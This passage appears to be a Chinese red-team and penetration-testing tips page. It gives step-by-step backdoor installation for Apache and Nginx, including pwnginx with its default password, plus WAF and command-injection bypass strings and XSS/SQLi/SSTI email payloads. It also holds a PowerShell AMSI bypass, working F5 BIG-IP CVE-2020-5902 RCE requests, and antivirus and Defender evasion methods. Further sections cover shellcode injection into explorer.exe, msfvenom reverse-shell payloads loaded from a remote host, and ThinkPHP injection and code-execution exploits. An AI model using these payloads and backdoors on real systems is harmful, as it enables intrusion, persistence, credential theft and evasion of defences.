Module后门3</h3><pre><code>From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247491179&amp;idx=1&amp;sn=ab26fe36ac74f5b140e91279ae8018c7生成模板结构&gt;apxs -g -n phpdevmod</code></pre><p><img src="./img/635.png" alt="image"></p><pre><code>编辑mod_phpdevmod.c文件编译&gt;make -e CC=x86_64-linux-gnu-g++</code></pre><p><img src="./img/636.png" alt="image"></p><pre><code>生成的.so文件在/.libs目录下</code></pre><p><img src="./img/637.png" alt="image"></p><pre><code>将其复制到/usr/lib/apache2/modules/目录修改/etc/apache2/mods-enabled/php7.0.load文件，添加如下LoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so&lt;Location /qq.jpg&gt;    #可以设置为任何不存在的文件    setHandler phpdevmod&lt;/Location&gt;</code></pre><p><img src="./img/638.png" alt="image"></p><pre><code>需重启apache服务访问后门方式http://ip/qq.jpg?命令的url编码直接访问后门文件</code></pre><p><img src="./img/639.png" alt="image"></p><pre><code>636174202F6574632F706173737764为cat /etc/passwd的url编码</code></pre><p><img src="./img/640.png" alt="image"></p><h3 id="Nginx-Lua后门"><a href="#Nginx-Lua后门" class="headerlink" title="Nginx Lua后门"></a>Nginx Lua后门</h3><pre><code>From:https://github.com/netxfly/nginx_lua_securityhttps://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md后门利用的前提是获取到root权限，nginx安装有lua模块。在nginx.conf中http节处添加，指定lua脚本位置，以及nginx启动时加载的脚本</code></pre><p><img src="./img/641.png" alt="image"></p><pre><code>在lua目录/waf/中新建Init.lua，内容如下，require nginx表示加载nginx.lua中的模块。</code></pre><p><img src="./img/642.png" alt="image"></p><pre><code>/waf/目录中新建nginx.lua实现执行命令，参数为waf。</code></pre><p><img src="./img/643.png" alt="image"></p><pre><code>在nginx配置文件中加入location。</code></pre><p><img src="./img/644.png" alt="image"></p><pre><code>效果：</code></pre><p><img src="./img/645.png" alt="image"></p><h3 id="PwnNginx"><a href="#PwnNginx" class="headerlink" title="PwnNginx"></a>PwnNginx</h3><pre><code>From:https://github.com/t57root/pwnginx解压好后编译客户端&gt;make</code></pre><p><img src="./img/646.png" alt="image"></p><pre><code>编辑nginx的源文件/src/core/nginx.c找到configure arguments:在后面添加--prefix=/usr/local/nginx\n指定的是nginx安装的目录</code></pre><p><img src="./img/647.png" alt="image"></p><pre><code>重新编译nginx添加后门模块&gt;./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module</code></pre><p><img src="./img/648.png" alt="image"></p><pre><code>&gt;make</code></pre><p><img src="./img/649.png" alt="image"></p><pre><code>覆盖新的nginx到原nginx目录&gt;cp -f objs/nginx /usr/local/nginx/sbin/nginx</code></pre><p><img src="./img/650.png" alt="image"></p><pre><code>重启nginx&gt;killall nginx&amp;/usr/local/nginx/sbin/nginx连接&gt;./pwnginx shell 目标机 nginx端口 密码默认密码是t57root，密码的配置文件在pwnginx-master\module\config.h文件夹中，可在重新编译nginx前修改密码</code></pre><p><img src="./img/651.png" alt="image"><br><img src="./img/652.png" alt="image"></p><pre><code>此后门也可开启socks隧道</code></pre><h1 id="渗透和红队tips"><a href="#渗透和红队tips" class="headerlink" title="渗透和红队tips"></a>渗透和红队tips</h1><h2 id="父进程破坏"><a href="#父进程破坏" class="headerlink" title="父进程破坏"></a>父进程破坏</h2><pre><code>命令explorer.exe / root与cmd.exe / c类似，只不过使用explorer会破坏进程树，会创建新实例explorer.exe，使之成为新实例下的子进程</code></pre><p><img src="./img/665.png" alt="image"><br><img src="./img/666.png" alt="image"></p><h2 id="loT高频率账户密码"><a href="#loT高频率账户密码" class="headerlink" title="loT高频率账户密码"></a>loT高频率账户密码</h2><p><img src="./img/678.png" alt="image"></p><h2 id="Bypass-mod-security"><a href="#Bypass-mod-security" class="headerlink" title="Bypass mod_security"></a>Bypass mod_security</h2><pre><code>Xss和注入bypass mod_security/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4... –&lt;marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)&gt;Y000&lt;/marquee&gt;/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5—%75%6e%69on = union %73%65%6cect = select %75%6e%69 = uni = url encode %73%65%6c = sel = url encode</code></pre><h2 id="查找git和svn的字典"><a href="#查找git和svn的字典" class="headerlink" title="查找git和svn的字典"></a>查找git和svn的字典</h2><p><img src="./img/679.jpg" alt="image"></p><h2 id="Top-25-重定向dorks"><a href="#Top-25-重定向dorks" class="headerlink" title="Top 25 重定向dorks"></a>Top 25 重定向dorks</h2><p><img src="./img/680.jpg" alt="image"></p><h2 id="使用grep快速去除垃圾数据"><a href="#使用grep快速去除垃圾数据" class="headerlink" title="使用grep快速去除垃圾数据"></a>使用grep快速去除垃圾数据</h2><pre><code>curl http://host.xx/file.js | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*cat file | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*</code></pre><p><img src="./img/684.png" alt="image"><br><img src="./img/685.png" alt="image"></p><h2 id="已泄露的密码整理出的字典"><a href="#已泄露的密码整理出的字典" class="headerlink" title="已泄露的密码整理出的字典"></a>已泄露的密码整理出的字典</h2><pre><code>https://github.com/FlameOfIgnis/Pwdb-Public从网上泄露的10亿条数据中整理出的。里面257,669,588被筛选为损坏的数据或测试账户。10亿个凭据可归结为168,919,919密码和393,386,953用户名.平均密码长度为9.4822个字符12.04%包含特殊字符，28.79%密码仅是字母，26.16%仅是小写，13.37%仅是数字，8.83%的密码仅被发现一次与rockyou的对比，rockyou包含14,344,391个密码，本字典与rockyou相差80%还有根据不同国家生成的小字典</code></pre><h2 id="命令注入Bypass"><a href="#命令注入Bypass" class="headerlink" title="命令注入Bypass"></a>命令注入Bypass</h2><pre><code>From: @shreyasrxcat /etc/passwd cat /e&quot;t&quot;c/pa&quot;s&quot;swd cat /&#39;e&#39;tc/pa&#39;s&#39; swd cat /etc/pa??wd cat /etc/pa*wd cat /et&#39; &#39;c/passw&#39; &#39;d cat /et$()c/pa$()$swdcat /et$&#123;neko&#125;c/pas$&#123;poi&#125; swd *echo &quot;dwssap/cte/ tac&quot; | rev $(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d) w\ho\am\i /\b\i\n/////s\h who$@ami xyz%0Acat%20/etc/passwd IFS=,;`cat&lt;&lt;&lt;uname,-a`/???/??t /???/p??s?? test=/ehhh/hmtc/pahhh/hmsswd cat $&#123;test//hhh\/hm/&#125; cat $&#123;test//hh??hm/&#125;cat /???/?????d&#123;cat,/etc/passwd&#125;</code></pre><h2 id="查询是否存在heartbleed漏洞"><a href="#查询是否存在heartbleed漏洞" class="headerlink" title="查询是否存在heartbleed漏洞"></a>查询是否存在heartbleed漏洞</h2><pre><code>cat list.txt | while read line ; do echo &quot;QUIT&quot; | openssl s_client -connect $line:443 2&gt;&amp;1 | grep &#39;server extension &quot;heartbeat&quot; (id=15)&#39; || echo $line: safe; done</code></pre><p><img src="./img/712.png" alt="image"></p><h2 id="远程解压文件"><a href="#远程解压文件" class="headerlink" title="远程解压文件"></a>远程解压文件</h2><pre><code>pip install remotezip#列出远程压缩包文件内容remotezip -l http://site/bigfile.zip#解压里面的文件remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;</code></pre><h2 id="Top25-ssrf-dorks"><a href="#Top25-ssrf-dorks" class="headerlink" title="Top25 ssrf dorks"></a>Top25 ssrf dorks</h2><p><img src="./img/714.jpg" alt="image"></p><h2 id="使用SecurityTrails-API查询子域名"><a href="#使用SecurityTrails-API查询子域名" class="headerlink" title="使用SecurityTrails API查询子域名"></a>使用SecurityTrails API查询子域名</h2><pre><code>去https://securitytrails.com/申请个免费的APIcurl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq &#39;.subdomains[]&#39; | sed &#39;s/\&quot;//g&#39; &gt;test.txt 2&gt;/dev/null &amp;&amp; sed &quot;s/$/.target.com/&quot; test.txt | sed &#39;s/ //g&#39; &amp;&amp; rm test.txt</code></pre><p><img src="./img/715.png" alt="image"></p><h2 id="邮件地址payload"><a href="#邮件地址payload" class="headerlink" title="邮件地址payload"></a>邮件地址payload</h2><pre><code>XSStest+(&lt;script&gt;alert(0)&lt;/script&gt;)@example.comtest@example(&lt;script&gt;alert(0)&lt;/script&gt;).com&quot;&lt;script&gt;alert(0)&lt;/script&gt;&quot;@example.comSSTI&quot;&lt;%= 7 * 7 %&gt;&quot;@example.comtest+($&#123;&#123;7*7&#125;&#125;)@example.comSQL injection&quot;&#39; OR 1=1 -- &#39;&quot;@example.com &quot;mail&#39;); --&quot;@example.comSSRFjohn.doe@abc123.dnslog.cnjohn.doe@[127.0.0.1]头注入&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com&quot;recipient@test.com&gt;\r\nRCPT TO:&lt;victim+&quot;@test.com</code></pre><h2 id="Web-server日志分析命令"><a href="#Web-server日志分析命令" class="headerlink" title="Web server日志分析命令"></a>Web server日志分析命令</h2><pre><code>https://gist.github.com/hvelarde/ceac345c662429447959625e6feb2b47通过状态码获取请求总数awk &#39;&#123;print $9&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort –rn</code></pre><p><img src="./img/716.png" alt="image"></p><pre><code>按照IP的请求数量排序awk &#39;&#123;print $1&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;</code></pre><p><img src="./img/717.png" alt="image"></p><pre><code>按照ua的请求数量排序awk -F&#39;&quot;&#39; &#39;&#123;print $6&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head</code></pre><p><img src="./img/718.png" alt="image"></p><pre><code>按照url的请求数量排序awk &#39;&#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head</code></pre><p><img src="./img/719.png" alt="image"></p><pre><code>按照请求页面为404的url排序awk &#39;$9 ~ /404/ &#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head按照请求致后端报错的IP排序awk &#39;$0 ~ /\[error\]/ &amp;&amp; match($0, /(client: )(.*)(, server)/, arr) &#123;print arr[2]&#125;&#39; /var/log/apache2/error.log | sort | uniq -c | sort -rn | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;获取最近10分钟的请求awk -v date=$(date +[%d/%b/%Y:%H:%M --date=&quot;-10 minutes&quot;) &#39;$4 &gt; date&#39; /var/log/nginx/access.log</code></pre><h2 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h2><pre><code>$a =[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUt&#39;+&#39;ils&#39;)$h=&quot;4456625220575263174452554847&quot;$s =[string](0..13|%&#123;[char][int](53+($h).substring(($_*2),2))&#125;)-replace &quot; &quot;$b =$a.GetField($s,&#39;NonPublic,Static&#39;)$b.SetValue($null,$true)</code></pre><p><img src="./img/720.png" alt="image"></p><h2 id="Bypass-AMSI-2"><a href="#Bypass-AMSI-2" class="headerlink" title="Bypass AMSI 2"></a>Bypass AMSI 2</h2><pre><code>https://github.com/crawl3r/FunWithAMSI直接编译完使用即可[System.Reflection.Assembly]::LoadFile(&quot;C:\\Users\\test\\Desktop\\AmsiFun.dll&quot;)[Amsi]::Bypass()</code></pre><p><img src="./img/726.png" alt="image"><br><img src="./img/727.png" alt="image"><br><img src="./img/728.png" alt="image"></p><h2 id="CVE-2020-5902"><a href="#CVE-2020-5902" class="headerlink" title="CVE-2020-5902"></a>CVE-2020-5902</h2><pre><code>F5 BIG-IP TMUI RCEhttps://raw.githubusercontent.com/jas502n/CVE-2020-5902/master/CVE-2020-5902.pyRCEcurl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;读文件curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#39;执行Linux命令/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash/fileSave.jsp?fileName=/tmp/cmd&amp;content=id/tmshCmd.jsp?command=list+/tmp/cmd/tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre><h2 id="一些可尝试绕过白名单的执行"><a href="#一些可尝试绕过白名单的执行" class="headerlink" title="一些可尝试绕过白名单的执行"></a>一些可尝试绕过白名单的执行</h2><pre><code>forfiles /p c:\windows\system32 /m notepad.exe /c &lt;bin&gt; explorer.exe /root,&quot;&lt;bin&gt;&quot; pcalua.exe -a &lt;bin&gt; scriptrunner.exe -appvscript &lt;bin&gt; wmic process call create &lt;bin&gt; rundll32.exe advpack.dll, RegisterOCX &lt;bin&gt;</code></pre><h2 id="绕过lsa-protection"><a href="#绕过lsa-protection" class="headerlink" title="绕过lsa protection"></a>绕过lsa protection</h2><pre><code>https://github.com/RedCursorSecurityConsulting/PPLKiller</code></pre><p><img src="./img/733.png" alt="image"><br><img src="./img/734.png" alt="image"><br><img src="./img/735.png" alt="image"><br><img src="./img/736.png" alt="image"><br><img src="./img/737.png" alt="image"></p><h2 id="Pezor免杀"><a href="#Pezor免杀" class="headerlink" title="Pezor免杀"></a>Pezor免杀</h2><pre><code>使用inline_syscall内联注入shellcode，结合sgn，donut等项目，增加了一些反调试技巧https://github.com/phra/PEzor$ git clone https://github.com/phra/PEzor.git $ cd PEzor $ sudo bash install.sh $ bash PEzor.sh –h这里测试下mimikatz，-sleep设置为2分钟，执行后需等两分钟打包之前</code></pre><p><img src="./img/738.png" alt="image"></p><pre><code>打包之后</code></pre><p><img src="./img/739.png" alt="image"><br><img src="./img/740.png" alt="image"><br><img src="./img/741.png" alt="image"></p><pre><code>测试下Covenant</code></pre><p><img src="./img/742.png" alt="image"><br><img src="./img/743.png" alt="image"><br><img src="./img/744.png" alt="image"></p><h2 id="动态调用进程注入逻辑"><a href="#动态调用进程注入逻辑" class="headerlink" title="动态调用进程注入逻辑"></a>动态调用进程注入逻辑</h2><pre><code>感兴趣可阅读以下https://github.com/dtrizna/DInvoke_PoChttps://rastamouse.me/blog/process-injection-dinvoke/https://thewover.github.io/Dynamic-Invoke/这里测试的是使用donut的python模块。注入notepad进程</code></pre><p><img src="./img/745.png" alt="image"><br><img src="./img/746.png" alt="image"></p><h2 id="在Windows-Server-2016和2019中绕过Windows-Defender"><a href="#在Windows-Server-2016和2019中绕过Windows-Defender" class="headerlink" title="在Windows Server 2016和2019中绕过Windows Defender"></a>在Windows Server 2016和2019中绕过Windows Defender</h2><pre><code>当获得了一个webshell的时候，下一步要反弹个shell回来</code></pre><p><img src="./img/747.png" alt="image"></p><pre><code>在尝试了https://github.com/trustedsec/unicorn独角兽失败之后，找到了一篇使用golang将shellcode注入到内存的文章https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/https://github.com/brimstone/go-shellcodehttps://golang.org/pkg/syscall/?GOOS=windows#NewLazyDLL该代码利用golang中的syscall包来调用NewLazyDLL  方法来加载Kernel32.dll，加载Kernel32.dll后，即可将其用于寻址和内存分配。编译后的代码将十六进制格式的msfvenom内容用作命令行参数。由于代码存在许久，可能直接使用会被检测到，这里对其进行了修改，重命名所有变量，通过URL方式加载shellcode，为了绕过沙盒，添加了一些其他的参数，如果不存在参数则退出执行。用powershell下载到服务器</code></pre><p><img src="./img/748.png" alt="image"></p><pre><code>等了几分钟，发现文件没有被删除，再执行。Msf收到会话</code></pre><p><img src="./img/749.png" alt="image"></p><pre><code>在尝试了getuid命令之后，返回了错误，查看了以下目录，还是被删除了</code></pre><p><img src="./img/750.png" alt="image"><br><img src="./img/751.png" alt="image"></p><pre><code>本地复现了下，可以看到被检测到了</code></pre><p><img src="./img/752.png" alt="image"></p><pre><code>绕过可以看一下微软的文章https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-server-exclusions-microsoft-defender-antivirus#list-of-automatic-exclusionsWindows Server 2016和2019上的Microsoft Defender Antivirus自动将您注册为某些排除项，具体由您指定的服务器角色定义。请参阅  自动排除项列表 。这些排除项不会被windows defender检查。</code></pre><p><img src="./img/753.png" alt="image"></p><pre><code>按照文章，创建个目录PHP5433，修改文件为php-cgi.exe即可绕过wd的防护</code></pre><p><img src="./img/754.png" alt="image"><br><img src="./img/755.png" alt="image"><br><img src="./img/756.png" alt="image"><br><img src="./img/757.png" alt="image"></p><pre><code>使用烂土豆提权</code></pre><p><img src="./img/758.png" alt="image"></p><pre><code>文中webshell: https://github.com/NetSPI/cmdsql</code></pre><h2 id="内存中解码shellcode绕过av"><a href="#内存中解码shellcode绕过av" class="headerlink" title="内存中解码shellcode绕过av"></a>内存中解码shellcode绕过av</h2><pre><code>https://github.com/mhaskar/Shellcode-In-Memory-Decoder流程打开一个进程并检索该进程的HANDLE。在进程中分配空间（检索内存地址）。将数据（shellcode）写入该进程中。执行shellcode。我们可以使用几个Win32 API执行这些步骤：OpenProcess()VirtualAllocEx()WriteProcessMemory()CreateRemoteThread()正常情况下，我们将原始shellcode直接写入到内存中，但是如果AV /EDR检测到了Shellcode，它们肯定会发出警报所以我们在二进制文件中使用可逆的方式把shellcode编码，再解码写入内存来规避防护。比如加、减、异或、交换。使用cs生成个shellcode</code></pre><p><img src="./img/759.png" alt="image"></p><pre><code>使用python进行异或</code></pre><p><img src="./img/760.png" alt="image"></p><pre><code>该脚本读取我们的shellcode的每个操作码，然后将其与字节0x01（在这种情况下为我们的密钥）进行异或，将其打印为如下的shellcode ：</code></pre><p><img src="./img/761.png" alt="image"></p><pre><code>现在，我们将开始实现将为我们执行shellcode注入的C代码。编译方式x86_64-w64-mingw32-gcc decoder.c -o decoder.exe -w我将逐步介绍每个win32 API。打开过程并获取一个句柄我们需要选择一个向其注入shellcode的进程，然后需要检索该过程的句柄，以便可以对其执行一些操作，我们将使用OpenProcess win32 API</code></pre><p><img src="./img/762.png" alt="image"></p><pre><code>该代码将您要获取其句柄的进程ID作为第一个参数，然后它将使用具有PROCESS_ALL_ACCESS访问权限的OpenProcess()来打开该进程并将该句柄保存在变量process中，最后，为我们打印</code></pre><p><img src="./img/763.png" alt="image"></p><pre><code>成功检索到该句柄检索句柄后的下一步将是在该进程内分配空间，我们可以使用VirtualAllocEx()</code></pre><p><img src="./img/764.png" alt="image"></p><pre><code>base_address代表分配的内存的地址16行，我们将打印分配的内存的地址，并将其写入数据</code></pre><p><img src="./img/765.png" alt="image"></p><pre><code>0x29d0000作为地址，使用x64dbg附加explorer.exe进程，转到这里看看</code></pre><p><img src="./img/766.png" alt="image"></p><pre><code>可以看到函数VirtualAllocEx已为我们在explorer.exe中分配了内存空间，我们准备写入数据。接下来我们解码shellcode并写到内存中即使使用这种类型（这里用的是异或）的编码，我们的shellcode也可能会被标记，因此请确保在操作中使用之前使用更强的编码并对其进行测试。这里为测试就只使用的0x01</code></pre><p><img src="./img/767.png" alt="image"></p><pre><code>这段代码将使用密钥0x01对每个字节进行解码后，将我们的shellcode写入内存中运行</code></pre><p><img src="./img/768.png" alt="image"></p><pre><code>如图所见，我们将每个字节写入地址，现在我们用x64dbg进行调试，然后转到地址 0x3ce0000查看一下：</code></pre><p><img src="./img/769.png" alt="image"></p><pre><code>可以看到shellcode已经写入进去了。下一步就是执行shellcode了使用CreateRemoteThread()函数来执行</code></pre><p><img src="./img/770.png" alt="image"><br><img src="./img/771.png" alt="image"><br><img src="./img/772.png" alt="image"></p><h2 id="cshot-shellcode远程加载器"><a href="#cshot-shellcode远程加载器" class="headerlink" title="cshot shellcode远程加载器"></a>cshot shellcode远程加载器</h2><pre><code>From:https://github.com/anthemtotheego/C_Shothttp://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.htmlC_Shot是一种用C语言编写的攻击性安全工具，旨在通过HTTP / HTTPS下载远程shellcode二进制文件（.bin），注入并执行shellcode。1.shellcode注入其自己的进程2.使用父进程欺骗将shellcode注入子进程使用C_Shot之类的工具的好处是，我们要执行的恶意代码没有存储在二进制文件中，而是从远程位置检索，读入内存然后执行。这有助于使诸如C_Shot之类的工具对AV / EDR显得相当友好，并且不会被发现。</code></pre><p><img src="./img/773.png" alt="image"></p><pre><code>cl / D _UNICODE / D UNICODE cshot.c</code></pre><p><img src="./img/774.png" alt="image"></p><pre><code>生成分阶段payloadmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStaged.bin生成无阶段payloadmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= IP LPORT= PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStageless.bin现在我们已经建立了二进制文件，现在需要一个Web服务。例如运行python -m SimpleHTTPServer 80，或者将它们托管在外部某个地方。对于本文中的所有示例，我将使用github托管shellcode。</code></pre><p><img src="./img/775.png" alt="image"></p><pre><code>确保windows defender打开。</code></pre><p><img src="./img/776.png" alt="image"></p><pre><code>注入到自己的进程中</code></pre><p><img src="./img/777.png" alt="image"></p><pre><code>测试分阶段的shellcode会被windows defender拦截</code></pre><p><img src="./img/778.png" alt="image"></p><pre><code>无阶段的shellcode不会被拦截</code></pre><p><img src="./img/779.png" alt="image"></p><pre><code>获得shell</code></pre><p><img src="./img/780.png" alt="image"></p><pre><code>测试分阶段shellcode欺骗父进程方法：</code></pre><p><img src="./img/781.png" alt="image"><br><img src="./img/782.png" alt="image"></p><pre><code>获得shell</code></pre><p><img src="./img/783.png" alt="image"></p><pre><code>现在测试下CrowdStrike注入到自己的进程，两种shellcode都被拦截</code></pre><p><img src="./img/784.png" alt="image"><br><img src="./img/785.png" alt="image"></p><pre><code>欺骗父进程</code></pre><p><img src="./img/786.png" alt="image"></p><pre><code>获得shell</code></pre><p><img src="./img/787.png" alt="image"><br><img src="./img/788.png" alt="image"></p><pre><code>分阶段和无阶段的shellcode在使用欺骗父进程方法时都可以绕过av。此工具在公共发行版中，没有进行任何形式的API隐藏，字符串混淆，内存保护技巧等工作。如果未进行任何修改，则对该工具的静态分析应该很容易发现。</code></pre><h2 id="thinkphp渗透手段"><a href="#thinkphp渗透手段" class="headerlink" title="thinkphp渗透手段"></a>thinkphp渗透手段</h2><p><img src="./img/840.png" alt="image"></p><pre><code>thinkphp 3.2.3where注入利用字符串方式作为where传参时存在注入1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+exp注入这里使用全局数组进行传参(不要用I方法)，漏洞才能生效public function  getuser()&#123;    $User = D(&#39;User&#39;);    $map = array(&#39;id&#39; =&gt; $_GET[&#39;id&#39;]);    $user = $User-&gt;where($map)-&gt;find();    dump($user);&#125;id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+bind注入public function  getuser()&#123;    $data[&#39;id&#39;] = I(&#39;id&#39;);    $uname[&#39;username&#39;] = I(&#39;username&#39;);    $user = M(&#39;User&#39;)-&gt;where($data)-&gt;save($uname);    dump($user);&#125;id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxingfind/select/delete注入public function getuser()&#123;$user = M(&#39;User&#39;)-&gt;find(I(&#39;id&#39;));dump($user);&#125;?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)order by注入public function user()&#123;$data[&#39;username&#39;] = array(&#39;eq&#39;,&#39;admin&#39;);$user = M(&#39;User&#39;)-&gt;where($data)-&gt;order(I(&#39;order&#39;))-&gt;find();dump($user);&#125;order=id and(updatexml(1,concat(0x7e,(select user())),0))此文转自酒仙桥六号部队TP5开启debug下的数据库连接tp5.0.*在debug模式下如果在数据交互点构造如sql注入、空参数等方式使数据库查询等出错，在一定情况下可能导致数据库账号密码直接显示出来。（报错信息太细了不仔细容易忽略掉）</code></pre><p><img src="./img/789.png" alt="image"></p><pre><code>在debug模式下找注入点也可以通过报错语句进行构造，并且由于debug模式可能导致本来没有回显的注入变成报错注入。当然目标数据库无法外连的时候，这个注入就挺有用的了。</code></pre><p><img src="./img/790.png" alt="image"></p><pre><code>关于log文件的利用log文件是runtime/log目录下的，比较常见的路径类似：/runtime/log/2020001/01.log ，默认是启用的，关于该文件主要有以下三点利用方式。1.关于http请求的部分常见的log文件会记录http请求，如果对应的站点存在后台等登陆，可以通过记录请求中的cookie登陆后台。</code></pre><p><img src="./img/791.png" alt="image"></p><pre><code>2.关于构造sql注入某些配置下日志还会记录sql语句的执行和报错，可以用于构造sql注入，但是一般这种利用比较少，需要先找到数据交互点然后和日志中记录的赋值以及报错一一对应。3.关于cache文件名tp下通过缓存文件获取webshell是一个老生常谈的问题，白盒下理论上都说得通，但是实际上在使用该漏洞的时候是存在部分难点的，如生成cache文件的方式，cache文件名等。在log文件中可能存在cache文件生成时的报错，这样可以确定目标tp的cache文件命名方式等，举个例子：在某次渗透中目标tp的log文件。</code></pre><p><img src="./img/792.png" alt="image"></p><pre><code>可以注意到这里由于生成缓存文件出错，导致直接将缓存文件的文件名输出。根据输出的缓存文件名去猜测生成规则，由于tp5的缓存文件命名默认是md5(value)，所以大部分时候可以把文件名等带进value进行比对。这里通过猜测和比对确定是view的文件绝对路径生成的cache文件名。</code></pre><p><img src="./img/793.png" alt="image"></p><pre><code>一般来说使用php原生的md5函数去生成md5比较稳妥，笔者为了方便直接在线加密的。这里基本上就排除了cache getshell的一大难题。之后正常去寻找能进库的交互点，比如发帖，留言这种，就能想办法获取webshell了。tp5路由thinkphp系列的官方开发文档是期望网站运维人员将public设置为web根目录，即使用./public/index.php作为入口文件。在实际的渗透过程中由于thinkphp是框架涉及很多二次开发，部分开发人员会选择自定义一个入口文件而不置于public目录下，如/var/www/html/index.php的形式。这里会涉及到打exp的路由问题，由于部分开发人员自定的入口文件可能导致调用的路径出现差异。一般来说打exp的时候尽量使用./public/index.php来打，以下列exp为例：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1可能会出现例如：http://xxx/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://xxx/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://xxx/index.php?s=\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1所以很多时候不是打一个exp无效就代表没洞，在黑盒测试的时候可能只是没有找对路由。下面是实战中的案例：</code></pre><p><img src="./img/794.png" alt="image"></p><pre><code>可以看到如果以常规的exp进行测试是返回方法不存在的，因为原生路由被二次开发修改了，所以最终代码执行的payload如下：</code></pre><p><img src="./img/795.png" alt="image"></p><pre><code>5.0.*和5.1.*相对来说5.0可利用的exp比较5.1要多一些，5.1主要的利用方式还是上面举例用的exp。App.php出现问题的代码如下：</code></pre><p><img src="./img/796.png" alt="image"></p><pre><code>其实就是把反斜杠认定为类名，最终使得类实例化，具体的分析在这里就不拿出来水字数了。而在渗透的过程中大的思路其实是差不多的，尝试多种exp，尝试读log文件等，可以通过简单比对两个版本的目录结构在没有其他信息的情况下判断版本。TP5：</code></pre><p><img src="./img/797.png" alt="image"></p><pre><code>TP5.1：</code></pre><p><img src="./img/798.png" alt="image"></p><pre><code>如果网站不是以/public/作为根目录的话，又没通过报错直接体现版本的，可以通过访问目录看目录是否存在来做判断比如访问./thinkphp/，这里不推荐通过/app/目录来做判断，因为笔者遇到过很多开发者会修改这个目录，比方说改成/apps/，/applications/，也就无法准确判断是5.1还是5.0。tp3的渗透思路tp3 关于log文件相关的利用同上，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：Application\Runtime\Logs\Home\16_09_09.log。sql注入tp3的sql注入指的是框架层面的注入问题，即二次开发的时候如果调用了model内的find, delete, select方法的话，就可能出现注入问题。对于白盒测试而言，只要model.class.php没修复然后找到调用了方法的地方就可以挖掘到注入。以select方法简单做个分析。Model.class.php</code></pre><p><img src="./img/799.png" alt="image"></p><pre><code>函数可以接受一个options参数，为了构成注入肯定是要进入到_parseOptions方法，也就是要绕过两次判断，也就是只要传输的options为数组，同时主键不是数组，就能进到_parseOptions方法。</code></pre><p><img src="./img/800.png" alt="image"></p><pre><code>可以看到传入options[&#39;table&#39;]或options[&#39;alias&#39;]且设置options[&#39;where&#39;]值为字符串，最终会options直接返回，整个过程是没有过滤的，然后进到ThinkPHP\Libray\Think\Db\Diver.class.php，进到select方法。</code></pre><p><img src="./img/801.png" alt="image"></p><pre><code>可以看到sql语句是最后的parseSql生成的。</code></pre><p><img src="./img/802.png" alt="image"></p><pre><code>跟进到parseWhere方法，只要绕过if，最终的return的sql语句是直接拼接的，也就是注入的产生原因，会直接带入select方法执行。</code></pre><p><img src="./img/803.png" 